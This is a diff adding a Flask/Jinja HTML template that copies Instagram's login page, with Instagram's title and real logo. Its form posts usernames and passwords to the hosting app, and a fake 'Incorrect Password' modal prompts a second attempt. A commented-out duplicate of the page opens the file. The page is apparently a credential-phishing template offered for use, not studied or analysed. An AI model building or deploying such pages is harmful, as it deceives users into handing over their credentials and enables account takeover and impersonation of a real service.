@@ -1,0 +1,88 @@
+<!-- 
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+    <link rel="stylesheet" href="{{ url_for('static', filename='css/style.css') }}">
+</head>
+<body>
+    <div class="container">
+        <div class="login-box">
+            <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252de00b20.png" alt="Instagram" class="logo">
+            <form class="login-form" method="post">
+                <input type="text" name="email_or_phone" placeholder="Phone number, username, or email" class="input-field" required>
+                <input type="password" name="password" placeholder="Password" class="input-field" required>
+                <button type="submit" class="login-btn">Log In</button>
+                <div class="separator">OR</div>
+                <button type="button" class="facebook-btn">Log in with Facebook</button>
+                <a href="#" class="forgot-password">Forgot password?</a>
+            </form>
+        </div>
+        <div class="signup-box">
+            <p>Don't have an account? <a href="#" class="signup-link">Sign up</a></p>
+        </div>
+    </div>
+</body>
+</html> -->
+
+
+
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+    <link rel="stylesheet" href="{{ url_for('static', filename='css/style.css') }}">
+</head>
+<body>
+    <div class="container">
+        <div class="login-box">
+            <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252de00b20.png" alt="Instagram" class="logo">
+            <form class="login-form" method="post">
+                <input type="text" name="email_or_phone" placeholder="Phone number, username, or email" class="input-field" required>
+                <input type="password" name="password" placeholder="Password" class="input-field" required>
+                <button type="submit" class="login-btn">Log In</button>
+                <div class="separator">OR</div>
+                <button type="button" class="facebook-btn">Log in with Facebook</button>
+                <a href="#" class="forgot-password">Forgot password?</a>
+            </form>
+        </div>
+        <div class="signup-box">
+            <p>Don't have an account? <a href="#" class="signup-link">Sign up</a></p>
+        </div>
+    </div>
+
+    <!-- Modal for error message -->
+    {% if error %}
+    <div id="errorModal" class="modal">
+        <div class="modal-content">
+            <p class="error-header">Incorrect Password</p>
+            <p class="error-body">{{ error }}</p>
+            <button id="tryAgainBtn" class="try-again-btn">Try Again</button>
+        </div>
+    </div>
+    {% endif %}
+
+    <script>
+        // Get the modal
+        var modal = document.getElementById("errorModal");
+
+        // Get the try again button
+        var tryAgainBtn = document.getElementById("tryAgainBtn");
+
+        // When the user clicks the try again button, redirect to the main page
+        tryAgainBtn.onclick = function() {
+            window.location.href = "{{ url_for('login') }}";
+        }
+
+        // Show the modal if there's an error
+        {% if error %}
+        modal.style.display = "block";
+        {% endif %}
+    </script>
+</body>
+</html>
